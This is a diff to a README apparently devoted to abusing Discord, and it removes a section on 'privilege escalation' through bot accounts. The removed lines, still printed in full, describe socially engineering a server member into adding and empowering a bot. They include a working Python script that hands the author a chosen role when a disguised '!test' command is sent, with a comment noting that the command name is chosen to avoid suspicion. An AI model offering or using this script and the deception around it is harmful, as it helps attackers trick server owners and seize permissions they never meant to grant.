@@ -11,7 +11,6 @@ This is a repository with everything you need to know about abusing the Discord 
 - [UserIDs](https://github.com/13-05/hidden-disc-docs/#more-about-userids)
 - [Log-Ins](https://github.com/13-05/hidden-disc-docs#discord-and-log-ins-what-to-know--how-to-abuse-it-credit-monst3red-and-hxr404)
 - [The API](https://github.com/13-05/hidden-disc-docs/#the-api)
-- [Privilege Escalation](https://github.com/13-05/hidden-disc-docs/#privilege-escalation-with-the-help-of-bot-users)
 - [Markdown](https://github.com/13-05/hidden-disc-docs/#messages--markdown)
 - [Discord's Webpack Implementation](https://github.com/13-05/hidden-disc-docs#discords-api-frontend-a-custom-webpack-implementation)
 
@@ -167,45 +166,6 @@ Users with any form of 2fa (like Google Authenticator) have "MFA Accounts." Thes
 
 #### Normal Accounts
 Users without 2fa in any form can change their password to change their token.
-
-## Privilege Escalation (with the help of Bot-Users)
-This topic deserves a section all of its own, because it's so complicated.
-Here's the stuff required to escalate your privileges in a certain server:
-- Social engineering, to convince someone to invite your bot
-- Programming knowledge, to write or understand a privilege-escalating script
-
-Alright, now that I got those two out of the way, let's go through it.
-
-Here's a quick script to give yourself a role:
-```py
-import discord
-from discord.utils import get
-import asyncio
-
-bot_token = input('bot token: ')
-role_to_give = input('EXACT name of role you\'d like to give yourself: ')
-
-client = discord.Client()
-
-@client.event
-async def on_ready():
-  print(f"logged in as {client.user}, privilege escalation script is running.")
-  
-@client.event
-async def on_message(message, *member: discord.Member):
-  if message.content == "!test": # fake command name so it's not suspicious; "you're just testing a new command"
-    role = get(message.guild.roles, name=role_to_give)
-    member = message.author
-    try:
-      await member.add_roles(role) 
-      print(f"Successfully gave {message.author} the role {role_to_give}!")
-    except:
-      print("There was an error in privilege escalation; make sure your bot has permission to give you this role.")
-
-client.run(bot_token)
-```
-Now, you need to run this script on a bot account. Then, you need to convince someone with good enough permissions to add your bot, and make them give your bot sufficient permissions to perform the privilege escalation on you.
-Once that's done, you can do whatever you want with your new perms!
 
 ## Messages & Markdown
 Alright, so this *also* deserves a section on its own, but not much is here.
